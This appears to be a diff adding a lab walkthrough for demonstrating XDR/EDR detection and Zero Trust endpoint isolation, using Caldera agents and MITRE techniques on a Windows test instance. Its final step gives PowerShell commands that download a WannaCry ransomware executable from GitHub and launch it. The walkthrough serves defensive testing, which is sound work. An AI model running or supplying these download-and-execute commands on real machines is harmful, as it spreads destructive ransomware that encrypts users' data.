@@ -1,0 +1,30 @@
+Make sure the XDR/EDR Agent is Enabled;
+
+Deploy the Caldera Agents;
+
+Create a new Operation;
+Select the Operation "You Shall (Not) Pass";
+
+Select the "Manual Command" Option
+Select the CMD interpreter, type "hostname" and click on Add Command
+Wait for the result and check if the hostname matches with the Windows Instance
+
+Select the "Potential Link" Option
+Select the Powershell interpreter
+Search and Execute the Tatic T1113 (Screen Capture).
+After 5 minutes, VisionOne should show this event as a Workbench
+
+Now its time to configure Zero Trust Secure Access rules
+Make sure you have a new policy to isolate the any endpoint which reaches or exceed the Risk Index -60-
+
+Select the "Potential Link" Option
+Select the Powershell or CMD interpreter
+Select the Mitre Techniques which makes sense based on the objective of your demo (you can add many at the same time)
+
+The Risk Score of your computer should be much higher than before
+
+Now its time to deliver the Ransomware payload to the Windows Instance
+Select the "Manual Command" Option
+Select the Powershell interpreter, type paste the following commands (wait for the completion of the first command before using the second command)
+"Invoke-WebRequest -Uri https://github.com/limiteci/WannaCry/raw/main/WannaCry.EXE -OutFile wcry.exe"
+"Start-Process wcry.exe""
